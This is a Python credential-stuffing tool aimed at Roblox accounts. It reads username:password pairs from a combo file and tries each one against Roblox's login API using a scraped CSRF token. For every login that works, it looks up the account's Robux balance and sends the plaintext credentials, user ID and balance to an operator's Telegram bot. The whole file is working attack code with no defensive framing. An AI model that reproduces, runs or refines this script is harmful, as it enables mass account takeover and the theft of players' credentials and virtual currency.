import requests
from bs4 import BeautifulSoup

def send_to_telegram(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"[!] Failed to send message to Telegram: {e}")

def login(username, password, session, bot_token, chat_id):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    login_page = session.get('https://www.roblox.com/login', headers=headers)
    csrf_token = BeautifulSoup(login_page.content, 'html.parser').find('meta', {'name': 'csrf-token'})['data-token']
    
    login_headers = {
        'User-Agent': headers['User-Agent'],
        'X-CSRF-TOKEN': csrf_token,
        'Content-Type': 'application/json'
    }

    login_data = {
        'ctype': 'Username',
        'cvalue': username,
        'password': password
    }

    response = session.post('https://auth.roblox.com/v2/login', json=login_data, headers=login_headers)

    if response.status_code == 200 and "user" in response.json():
        user_data = response.json()['user']
        robux = get_robux(session, user_data['id'])
        msg = f"✅ Login Successful\nUsername: {username}\nPassword: {password}\nUser ID: {user_data['id']}\nRobux: {robux}"
        print(msg)
        send_to_telegram(bot_token, chat_id, msg)
    else:
        print(f"❌ Login Failed: {username}:{password}")

def get_robux(session, user_id):
    response = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
    if response.status_code == 200:
        return response.json().get('robux', 'Unknown')
    return 'Unknown'

def main():
    bot_token = input("Enter your Telegram Bot Token: ").strip()
    chat_id = input("Enter your Telegram Chat ID: ").strip()
    combo_path = input("Enter combo file path: ").strip()

    try:
        with open(combo_path, 'r') as file:
            combos = file.readlines()
    except FileNotFoundError:
        print("[!] Combo file not found.")
        return

    session = requests.Session()

    for combo in combos:
        if ':' in combo:
            username, password = combo.strip().split(':', 1)
            login(username, password, session, bot_token, chat_id)

if __name__ == "__main__":
    main()
